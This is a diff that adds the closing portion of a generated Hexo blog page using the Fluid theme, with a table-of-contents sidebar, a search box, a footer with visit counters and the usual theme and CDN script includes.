+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+ 
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/js/DynamicLine.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
+
+<!--浏览器搞笑标题-->
+<script type="text/javascript" src="\js\FunnyTitle.js"></script>
+<!--鼠标点击礼花特效-->
+<script async src="/js/fireworks.js"></script>
